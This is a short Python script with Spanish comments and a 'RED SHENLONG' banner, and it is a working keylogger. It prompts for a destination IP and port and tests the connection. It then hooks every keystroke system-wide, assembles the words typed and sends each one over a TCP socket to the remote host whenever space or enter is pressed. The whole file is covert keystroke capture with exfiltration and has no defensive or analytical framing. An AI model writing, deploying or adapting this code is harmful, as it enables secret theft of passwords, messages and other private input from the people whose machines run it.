print("""
************************************************************************************************
*  ######  ####### ######      #####  #     # ####### #     # #       ####### #     #  #####   *
*  #     # #       #     #    #     # #     # #       ##    # #       #     # ##    # #     #  *
*  #     # #       #     #    #       #     # #       # #   # #       #     # # #   # #        *
*  ######  #####   #     #     #####  ####### #####   #  #  # #       #     # #  #  # #  ####  *
*  #   #   #       #     #          # #     # #       #   # # #       #     # #   # # #     #  *
*  #    #  #       #     #    #     # #     # #       #    ## #       #     # #    ## #     #  *
*  #     # ####### ######      #####  #     # ####### #     # ####### ####### #     #  #####   *                                                                                            
************************************************************************************************
""")
import keyboard
import socket

palabra = ""

# ==========================================
# FUNCIONES
# ==========================================

def validar_y_conectar():
    while True:
        print("\n----- Configuración de Red -----")
        ip_destino = input("➤  IP destino: ").strip()
        puerto_input = input("➤  Puerto: ").strip()
        try:
            puerto = int(puerto_input)
        except ValueError:
            print("Error: El puerto debe ser un número entero.")
            continue
        if not (1 <= puerto <= 65535):
            print(f"Error: El puerto {puerto} está fuera de rango (1-65535).")
            continue

        print(f"Verificando conexión con {ip_destino}:{puerto}...")
        try:
            with socket.create_connection((ip_destino, puerto), timeout=3):
                print(f"Conexión establecida con éxito con {ip_destino}")
                return ip_destino, puerto 
        except (socket.timeout, ConnectionRefusedError, OSError) as e:
            print(f"No se pudo conectar a {ip_destino}:{puerto}.")
            print(f"Detalle: {e}")
            print("Por favor, verifica la IP o asegúrate de que el puerto esté abierto.")

def enviar_archivo_via_sockets(mensaje, ip, puerto):
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as conexion:
            conexion.settimeout(5)
            conexion.connect((ip, puerto))
            conexion.sendall(mensaje.encode())
    except Exception as e:
        print(f"Hubo un error en la conexión: {e}")

def pulsacion_tecla(pulsacion):
    global palabra

    if pulsacion.event_type == keyboard.KEY_DOWN:
        if pulsacion.name == 'space' or pulsacion.name == 'enter':
            delimitador = "\n" if pulsacion.name == 'enter' else " "
            mensaje_completo = palabra + delimitador
            
            enviar_archivo_via_sockets(mensaje_completo, direccion_ip_destino, puerto_destino)
            
            print(f"Enviado: {palabra}")
            palabra = "" 
            
        elif pulsacion.name == 'backspace':
            if palabra:
                palabra = palabra[:-1]
        
        elif len(pulsacion.name) == 1 and pulsacion.name.isprintable():
            palabra += pulsacion.name

# ==========================================
# MAIN
# ==========================================
direccion_ip_destino, puerto_destino = validar_y_conectar()
print(f"\nScript listo. Enviando pulsaciones a {direccion_ip_destino}:{puerto_destino}")
keyboard.hook(pulsacion_tecla)
try:
    keyboard.wait()
except KeyboardInterrupt:
    print("\nScript detenido por el usuario.")